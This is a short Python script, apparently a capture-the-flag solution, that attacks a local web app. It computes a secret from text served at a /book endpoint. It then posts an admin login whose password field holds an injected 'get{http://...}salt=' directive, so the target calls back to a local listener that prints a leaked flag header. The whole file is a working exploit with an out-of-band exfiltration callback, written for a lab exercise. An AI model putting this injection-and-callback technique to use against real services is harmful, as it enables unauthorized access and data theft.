from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import time
import threading
import requests

#host_name = "192.168.1.69"
host_name="127.0.0.1"
server_port = 8080
shared_secret = ""
vuln = 'get{http://' + host_name + ':' + str(server_port) + '/}salt='
#server_host_name = "http://localhost:80/"
server_host_name = "http://localhost:4200/"

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes("ciao", "utf-8"))
        print('flag: ' + self.headers['not-found'])

def start_server():
    webServer = HTTPServer((host_name, server_port), MyServer)
    print("Server started http://%s:%s" % (host_name, server_port))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")

def find_most_frequent_char(paragraph):
    all_freq = {}
    for i in paragraph:
        if i in all_freq:
            all_freq[i] +=1
        else:
            all_freq[i] = 1
    return str(max(all_freq, key= all_freq.get))

def generate_shared_secret():
    global server_host_name, shared_secret
    url = server_host_name
    url += 'book'
    response = requests.get(url)
    response = response.json()

    for paragraph in response:
        shared_secret += find_most_frequent_char(paragraph['paragraph'].replace(" ", ""))
    print("shared secret: " + shared_secret)

def request_flag():
    global server_host_name, vuln
    vuln += shared_secret
    request_params = {'username': 'admin', 'password' : vuln }
    print(request_params)
    encoded_params = parse.urlencode(request_params)
    url = server_host_name
    url += 'login?'
    url += encoded_params
    x = requests.post(url)

if __name__ == "__main__":
    x = threading.Thread(target=start_server)
    x.start()
    time.sleep(1)
    generate_shared_secret()
    request_flag()
